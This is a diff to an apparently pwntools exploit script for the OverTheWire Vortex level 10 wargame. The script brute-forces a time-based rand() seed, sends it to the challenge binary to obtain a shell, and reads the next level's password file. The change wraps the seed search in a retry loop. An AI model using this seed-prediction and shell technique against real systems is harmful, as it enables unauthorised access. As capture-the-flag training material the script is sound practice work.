@@ -9,7 +9,7 @@ level    = 10
 host     = 'vortex.labs.overthewire.org'
 user     = 'vortex%i' % level
 chal     = 'vortex%i' % level
-password  = '<removed>'
+password  = args['PASSWORD']
 passfile = '/etc/vortex_pass/vortex%i' % (level+1)
 binary   = '/vortex/%s' % chal
 shell    = ssh(host=host, user=user, password=password)
@@ -28,21 +28,21 @@ shell['gcc -O3 ticks.c -o ticks']
 
 # Run our binary and their binary at the same time
 # so that the times are closer.
-sh    = shell.run('(./ticks && %s)' % binary)
-exec(sh.recvline()) # seed
-exec(sh.recvline()) # ticks
+def find_the_seed():
+    sh    = shell.run('(./ticks && %s)' % binary)
+    exec(sh.recvline()) # seed
+    exec(sh.recvline()) # ticks
 
-log.info("seed: %x" % seed)
-log.info("ticks: %x" % ticks)
+    log.info("seed: %x" % seed)
+    log.info("ticks: %x" % ticks)
 
-want = sh.recvline().strip()
-want = want.strip('[], ')
-want = want.split(',')
-want = [int('0x'+i.strip(), 16) for i in want]
+    want = sh.recvline().strip()
+    want = want.strip('[], ')
+    want = want.split(',')
+    want = [int('0x'+i.strip(), 16) for i in want]
 
-log.info("Needle: %s" % want)
+    log.info("Needle: %s" % want)
 
-def search(seed):
     for seed in xrange(seed-0x10000, seed+0x10000):
         libc.srand(seed)
         match = 0
@@ -55,13 +55,16 @@ def search(seed):
 
             if match > 15:
                 log.success("Found seed: %x" % seed)
-                return seed
-    log.fatal("Didn't find the seed")
-    return 0
+                sh.send(p32(seed))
+                return sh
+    log.info("Didn't find the seed")
+    return None
 
 # Search for the seed based off of our guess
 # When we find it, send it as a 4-byte packed integer
-sh.send(p32(search(seed)))
+sh = None
+while sh is None:
+    sh = find_the_seed()
 
 # Win
 sh.sendline('export PS1=""')
@@ -71,4 +74,7 @@ sh.sendline('id')
 log.success('id: ' + sh.recvline().strip())
 
 sh.sendline('cat %s' % passfile)
-log.success('Password: ' + sh.recvline().strip())
+password = sh.recvline().strip()
+log.success('Password: %s' % password)
+
+sys.stderr.write(password)
